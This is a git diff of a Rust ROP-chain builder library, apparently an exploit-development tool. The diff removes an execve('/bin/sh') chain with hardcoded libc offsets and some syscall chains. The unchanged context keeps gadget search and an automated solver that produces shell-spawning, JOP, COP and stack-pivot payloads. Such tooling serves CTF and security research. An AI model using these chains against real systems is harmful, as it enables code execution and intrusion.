@@ -1,5 +1,3 @@
-#![allow(clippy::upper_case_acronyms)]
-
 use capstone::prelude::*;
 use std::collections::HashMap;
 use std::fs;
@@ -37,14 +35,9 @@ impl RopChain {
     /// Create a new ROP chain builder
     ///
     /// # Example
-    /// ```no_run
-    /// # use talon::rop_tools::RopChain;
-    /// # fn main() -> Result<(), String> {
+    /// ```
     /// let mut rop = RopChain::new("./vulnerable")?;
-    /// let pop_rdi = rop.find_gadget("pop rdi; ret")
-    ///     .ok_or_else(|| "Gadget not found".to_string())?;
-    /// # Ok(())
-    /// # }
+    /// let pop_rdi = rop.find_gadget("pop rdi; ret")?;
     /// ```
     pub fn new(binary_path: &str) -> Result<Self, String> {
         log::info!("Initializing ROP chain builder for {}", binary_path);
@@ -198,7 +191,7 @@ impl RopChain {
             // Check for 'ret' (0xc3) or 'ret n' (0xc2)
             if window[0] == 0xc3 || window[0] == 0xc2 {
                 // Disassemble backwards to find gadget
-                let start = offset.saturating_sub(20);
+                let start = if offset >= 20 { offset - 20 } else { 0 };
                 let end = if offset + 1 < buffer.len() {
                     offset + 1
                 } else {
@@ -206,7 +199,7 @@ impl RopChain {
                 };
 
                 if let Ok(insns) = cs.disasm_all(&buffer[start..end], start as u64) {
-                    if !insns.is_empty() {
+                    if insns.len() > 0 {
                         // Create gadget from last few instructions
                         let mut instructions = Vec::new();
                         let mut bytes = Vec::new();
@@ -234,7 +227,7 @@ impl RopChain {
         }
 
         // Filter to useful gadgets (1-5 instructions ending in ret)
-        gadgets.retain(|g| g.instructions.len() <= 5 && !g.instructions.is_empty());
+        gadgets.retain(|g| g.instructions.len() <= 5 && g.instructions.len() > 0);
 
         // Score and sort gadgets
         for gadget in &mut gadgets {
@@ -264,7 +257,9 @@ impl RopChain {
             // High value gadgets
             if instr_lower.starts_with("pop rdi") {
                 score += 50;
-            } else if instr_lower.starts_with("pop rsi") || instr_lower.starts_with("pop rdx") {
+            } else if instr_lower.starts_with("pop rsi") {
+                score += 45;
+            } else if instr_lower.starts_with("pop rdx") {
                 score += 45;
             } else if instr_lower.starts_with("pop rax") {
                 score += 40;
@@ -284,7 +279,9 @@ impl RopChain {
                 score += 15;
             } else if instr_lower.starts_with("lea") {
                 score += 20;
-            } else if instr_lower.starts_with("add") || instr_lower.starts_with("sub") {
+            } else if instr_lower.starts_with("add") {
+                score += 10;
+            } else if instr_lower.starts_with("sub") {
                 score += 10;
             }
             // Penalties for bad instructions
@@ -338,120 +335,6 @@ impl RopChain {
         log::info!("Found {} ret2dlresolve gadgets", gadgets.len());
         Ok(gadgets)
     }
-
-    /// High-level semantic ROP solver with automatic stack alignment
-    pub fn solve(&self, goal: &str) -> Result<Vec<u64>, String> {
-        log::info!("[*] ROP solver: goal = {}", goal);
-
-        match goal {
-            "shell" => self.solve_shell(),
-            "read" => self.solve_read(),
-            "write" => self.solve_write(),
-            _ => Err(format!("Unknown goal: {}", goal)),
-        }
-    }
-
-    /// Solve for shell execution (execve("/bin/sh"))
-    fn solve_shell(&self) -> Result<Vec<u64>, String> {
-        let libc_base = self
-            .libc_base
-            .ok_or("Libc base not set. Use set_libc_base()".to_string())?;
-
-        let pop_rdi = self
-            .find_gadget("pop rdi")
-            .ok_or("pop rdi gadget not found")?;
-
-        let system_offset = 0x050d60u64;
-        let binsh_offset = 0x1b3e1au64;
-
-        let system_addr = libc_base + system_offset;
-        let binsh_addr = libc_base + binsh_offset;
-
-        let mut chain = vec![pop_rdi, binsh_addr, system_addr];
-
-        self.apply_stack_alignment(&mut chain)?;
-
-        log::info!("[+] Shell ROP chain created ({} gadgets)", chain.len());
-        Ok(chain)
-    }
-
-    /// Solve for read syscall
-    fn solve_read(&self) -> Result<Vec<u64>, String> {
-        let pop_rdi = self
-            .find_gadget("pop rdi")
-            .ok_or("pop rdi gadget not found")?;
-        let pop_rsi = self
-            .find_gadget("pop rsi")
-            .ok_or("pop rsi gadget not found")?;
-        let pop_rdx = self
-            .find_gadget("pop rdx")
-            .ok_or("pop rdx gadget not found")?;
-        let pop_rax = self
-            .find_gadget("pop rax")
-            .ok_or("pop rax gadget not found")?;
-        let syscall = self
-            .find_gadget("syscall")
-            .ok_or("syscall gadget not found")?;
-
-        let mut chain = vec![
-            pop_rax, 0, pop_rdi, 0, pop_rsi, 0x600000, pop_rdx, 0x1000, syscall,
-        ];
-
-        self.apply_stack_alignment(&mut chain)?;
-
-        log::info!("[+] Read ROP chain created ({} gadgets)", chain.len());
-        Ok(chain)
-    }
-
-    /// Solve for write syscall
-    fn solve_write(&self) -> Result<Vec<u64>, String> {
-        let pop_rdi = self
-            .find_gadget("pop rdi")
-            .ok_or("pop rdi gadget not found")?;
-        let pop_rsi = self
-            .find_gadget("pop rsi")
-            .ok_or("pop rsi gadget not found")?;
-        let pop_rdx = self
-            .find_gadget("pop rdx")
-            .ok_or("pop rdx gadget not found")?;
-        let pop_rax = self
-            .find_gadget("pop rax")
-            .ok_or("pop rax gadget not found")?;
-        let syscall = self
-            .find_gadget("syscall")
-            .ok_or("syscall gadget not found")?;
-
-        let mut chain = vec![
-            pop_rax, 1, pop_rdi, 1, pop_rsi, 0x600000, pop_rdx, 0x100, syscall,
-        ];
-
-        self.apply_stack_alignment(&mut chain)?;
-
-        log::info!("[+] Write ROP chain created ({} gadgets)", chain.len());
-        Ok(chain)
-    }
-
-    /// Apply stack alignment (16-byte for x86_64)
-    fn apply_stack_alignment(&self, chain: &mut Vec<u64>) -> Result<(), String> {
-        match self.arch {
-            Architecture::X8664 => {
-                if !chain.len().is_multiple_of(2) {
-                    let ret_gadget = self
-                        .find_gadget("ret")
-                        .ok_or("Could not find ret gadget for alignment")?;
-
-                    log::info!("[*] Stack alignment: injected ret sled (16-byte)");
-                    chain.insert(0, ret_gadget);
-                }
-                Ok(())
-            }
-            Architecture::I386 => Ok(()),
-            _ => {
-                log::warn!("[!] Stack alignment not implemented for this architecture");
-                Ok(())
-            }
-        }
-    }
 }
 
 // ────────────────────────────────────────────────────────────────────────────
@@ -485,7 +368,7 @@ pub fn list_common_gadgets(rop: &RopChain) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  AUTOMATED ROP CHAIN GENERATION - AI-POWERED GADGET SOLVER
+// 🤖 AUTOMATED ROP CHAIN GENERATION - AI-POWERED GADGET SOLVER
 // ═══════════════════════════════════════════════════════════════════════════
 
 use serde::{Deserialize, Serialize};
@@ -555,7 +438,7 @@ pub struct AutoROPSolver {
 
 impl AutoROPSolver {
     pub fn new(binary_path: &str) -> Result<Self, String> {
-        println!("[AUTO-ROP]  Initializing automated ROP solver");
+        println!("[AUTO-ROP] 🤖 Initializing automated ROP solver");
         println!("[AUTO-ROP]   Binary: {}", binary_path);
 
         let arch = RopChain::detect_arch(binary_path)?;
@@ -585,7 +468,7 @@ impl AutoROPSolver {
         self.libc_path = Some(libc_path.to_string());
         self.libc_base = base;
 
-        println!("[AUTO-ROP]  Loading libc: {}", libc_path);
+        println!("[AUTO-ROP] 📚 Loading libc: {}", libc_path);
         if let Some(base) = base {
             println!("[AUTO-ROP]   Base address: 0x{:016x}", base);
         }
@@ -668,7 +551,7 @@ impl AutoROPSolver {
                 }],
                 payload_description: "Single gadget that spawns shell with proper constraints"
                     .to_string(),
-                constraints_satisfied: self.check_constraints(&[gadget]),
+                constraints_satisfied: self.check_constraints(&vec![gadget]),
                 success_probability: 0.95,
             })
         } else {
@@ -915,7 +798,7 @@ impl AutoROPSolver {
             }],
             payload_description: "JOP (Jump-Oriented Programming) chain using indirect jumps"
                 .to_string(),
-            constraints_satisfied: self.check_constraints(&[gadget.address]),
+            constraints_satisfied: self.check_constraints(&vec![gadget.address]),
             success_probability: 0.70,
         })
     }
@@ -944,7 +827,7 @@ impl AutoROPSolver {
             }],
             payload_description: "COP (Call-Oriented Programming) chain using indirect calls"
                 .to_string(),
-            constraints_satisfied: self.check_constraints(&[gadget.address]),
+            constraints_satisfied: self.check_constraints(&vec![gadget.address]),
             success_probability: 0.68,
         })
     }
@@ -966,13 +849,13 @@ impl AutoROPSolver {
                 instructions: pivot.instructions.clone(),
             }],
             payload_description: "Stack pivot to gain control over ROP chain location".to_string(),
-            constraints_satisfied: self.check_constraints(&[pivot.address]),
+            constraints_satisfied: self.check_constraints(&vec![pivot.address]),
             success_probability: 0.82,
         })
     }
 
     fn solve_generic(&self, goal: &ROPGoal) -> Result<ROPSolution, String> {
-        println!("[AUTO-ROP]  Using generic solver");
+        println!("[AUTO-ROP] 🔧 Using generic solver");
 
         let all_strategies = vec![
             ROPStrategy::OneGadget,
@@ -1010,7 +893,7 @@ impl AutoROPSolver {
         true
     }
 
-    pub fn check_constraints(&self, chain: &[u64]) -> bool {
+    fn check_constraints(&self, chain: &[u64]) -> bool {
         for constraint in &self.constraints {
             match constraint {
                 Constraint::NoNullBytes => {
@@ -1041,12 +924,6 @@ impl AutoROPSolver {
                                 return false;
                             }
                         }
-                    }
-                }
-                Constraint::StackAlignment(alignment) => {
-                    let chain_size = chain.len() * 8;
-                    if !chain_size.is_multiple_of(*alignment as usize) {
-                        return false;
                     }
                 }
                 _ => {}
@@ -1154,7 +1031,7 @@ mod tests {
     #[test]
     fn test_rop_chain_creation() {
         // Would need a real binary to test
-        assert!(std::mem::size_of::<RopChain>() > 0);
+        assert_eq!(std::mem::size_of::<RopChain>() > 0, true);
     }
 
     #[test]
@@ -1172,54 +1049,9 @@ mod tests {
 
     #[test]
     fn test_gadget_scoring() {
-        let score1 = RopChain::score_gadget(&["pop rdi".to_string(), "ret".to_string()]);
-        let score2 = RopChain::score_gadget(&["syscall".to_string()]);
+        let score1 = RopChain::score_gadget(&vec!["pop rdi".to_string(), "ret".to_string()]);
+        let score2 = RopChain::score_gadget(&vec!["syscall".to_string()]);
 
         assert!(score2 > score1); // syscall is more valuable
-    }
-
-    #[test]
-    fn test_stack_alignment_x86_64() {
-        let mut chain_odd = vec![0x400000, 0x400008, 0x400010];
-        let chain_even = vec![0x400000, 0x400008];
-
-        assert_eq!(chain_odd.len() % 2, 1);
-        assert_eq!(chain_even.len() % 2, 0);
-
-        let ret_gadget = 0x400123;
-
-        if chain_odd.len() % 2 != 0 {
-            chain_odd.insert(0, ret_gadget);
-        }
-
-        assert_eq!(chain_odd.len() % 2, 0);
-        assert_eq!(chain_odd[0], ret_gadget);
-        assert_eq!(chain_even.len() % 2, 0);
-    }
-
-    #[test]
-    fn test_rop_goal_types() {
-        let goal_system = ROPGoal::System("/bin/sh".to_string());
-        let goal_execve = ROPGoal::Execve("/bin/sh".to_string(), vec![]);
-        let goal_mprotect = ROPGoal::Mprotect(0x600000, 0x1000, 7);
-
-        match goal_system {
-            ROPGoal::System(cmd) => assert_eq!(cmd, "/bin/sh"),
-            _ => panic!("Wrong goal type"),
-        }
-
-        match goal_execve {
-            ROPGoal::Execve(cmd, _) => assert_eq!(cmd, "/bin/sh"),
-            _ => panic!("Wrong goal type"),
-        }
-
-        match goal_mprotect {
-            ROPGoal::Mprotect(addr, size, perms) => {
-                assert_eq!(addr, 0x600000);
-                assert_eq!(size, 0x1000);
-                assert_eq!(perms, 7);
-            }
-            _ => panic!("Wrong goal type"),
-        }
     }
 }
